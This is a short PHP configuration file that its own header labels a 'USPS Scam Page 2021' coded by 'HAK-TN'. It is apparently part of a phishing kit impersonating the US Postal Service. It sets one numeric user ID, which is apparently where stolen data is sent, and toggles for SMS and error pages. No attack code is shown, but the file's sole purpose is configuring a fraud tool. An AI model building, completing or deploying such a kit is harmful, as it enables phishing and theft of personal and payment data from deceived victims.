<?php
/* 
USPS Scam Page 2021
CODED BY HAK-TN
*/
$user_ids=array("1097892723");
$sms='1';
$error='1';
?>
